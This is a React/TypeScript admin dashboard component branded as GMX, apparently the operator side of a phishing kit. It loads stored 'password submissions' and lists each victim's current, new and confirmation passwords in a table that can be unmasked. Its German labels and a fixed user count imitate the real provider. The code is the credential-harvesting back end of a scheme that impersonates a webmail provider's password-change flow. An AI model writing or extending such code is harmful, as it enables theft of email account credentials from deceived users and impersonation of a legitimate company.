import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { useAuth } from "@/contexts/AuthContext";
import { Mail, Power, Users, Settings, BarChart3, Eye, EyeOff, Trash2 } from "lucide-react";
import { getSubmissions, type PasswordSubmission } from "@/lib/password-store";

const AdminDashboard = () => {
  const { isLoggedIn, username, logout } = useAuth();
  const navigate = useNavigate();
  const [submissions, setSubmissions] = useState<PasswordSubmission[]>([]);
  const [visibleIds, setVisibleIds] = useState<Set<string>>(new Set());

  useEffect(() => {
    if (!isLoggedIn) {
      navigate("/admin");
      return;
    }
    getSubmissions().then(setSubmissions);
  }, [isLoggedIn, navigate]);

  const toggleVisible = (id: string) => {
    setVisibleIds((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const handleLogout = () => {
    logout();
    navigate("/admin");
  };

  const refreshData = () => getSubmissions().then(setSubmissions);

  if (!isLoggedIn) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <header className="bg-primary py-3 px-6 flex items-center justify-between shadow-md">
        <div className="flex items-center gap-2">
          <Mail className="h-7 w-7 text-primary-foreground" />
          <span className="text-xl font-bold text-white tracking-tight">GMX</span>
          <span className="text-primary-foreground/70 text-sm ml-2">Admin Panel</span>
        </div>
        <div className="flex items-center gap-3">
          <span className="text-primary-foreground/80 text-sm hidden sm:inline">{username}</span>
          <button
            onClick={handleLogout}
            className="flex items-center gap-1.5 text-white hover:text-white text-sm transition-colors"
          >
            Abmelden
            <Power className="h-4 w-4" />
          </button>
        </div>
      </header>

      <main className="flex-1 p-6 max-w-5xl mx-auto w-full">
        <h1 className="text-2xl font-bold text-foreground mb-6">Dashboard</h1>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
          {[
            { icon: Users, label: "Benutzer", value: "1.247" },
            { icon: BarChart3, label: "Passwort-Eingaben", value: String(submissions.length) },
            { icon: Settings, label: "System", value: "Online", valueClass: "text-green-600" },
          ].map((item) => (
            <div key={item.label} className="bg-card rounded-lg border border-border p-6 flex items-center gap-4">
              <div className="h-12 w-12 rounded-lg bg-primary/10 flex items-center justify-center">
                <item.icon className="h-6 w-6 text-primary" />
              </div>
              <div>
                <p className="text-sm text-muted-foreground">{item.label}</p>
                <p className={`text-2xl font-bold ${item.valueClass || "text-foreground"}`}>{item.value}</p>
              </div>
            </div>
          ))}
        </div>

        {/* Password Submissions */}
        <div className="bg-card rounded-lg border border-border p-6 mb-6">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-lg font-semibold text-foreground">Eingegebene Passwörter</h2>
            <button
              onClick={refreshData}
              className="text-sm text-primary hover:underline"
            >
              Aktualisieren
            </button>
          </div>

          {submissions.length === 0 ? (
            <p className="text-sm text-muted-foreground py-4 text-center">
              Noch keine Passwort-Eingaben vorhanden.
            </p>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-border">
                    <th className="text-left py-2 pr-4 text-muted-foreground font-medium">Zeitpunkt</th>
                    <th className="text-left py-2 pr-4 text-muted-foreground font-medium">Aktuelles PW</th>
                    <th className="text-left py-2 pr-4 text-muted-foreground font-medium">Neues PW</th>
                    <th className="text-left py-2 pr-4 text-muted-foreground font-medium">Bestätigung</th>
                    <th className="text-right py-2 text-muted-foreground font-medium">Anzeigen</th>
                  </tr>
                </thead>
                <tbody>
                  {submissions.map((sub) => {
                    const show = visibleIds.has(sub.id);
                    const mask = (val: string) => (show ? val : "••••••••");
                    return (
                      <tr key={sub.id} className="border-b border-border last:border-0">
                        <td className="py-3 pr-4 text-foreground whitespace-nowrap">
                          {new Date(sub.created_at).toLocaleString("de-DE")}
                        </td>
                        <td className="py-3 pr-4 font-mono text-foreground">{mask(sub.current_password)}</td>
                        <td className="py-3 pr-4 font-mono text-foreground">{mask(sub.new_password)}</td>
                        <td className="py-3 pr-4 font-mono text-foreground">{mask(sub.confirm_password)}</td>
                        <td className="py-3 text-right">
                          <button
                            onClick={() => toggleVisible(sub.id)}
                            className="text-muted-foreground hover:text-foreground transition-colors"
                          >
                            {show ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                          </button>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </main>
    </div>
  );
};

export default AdminDashboard;
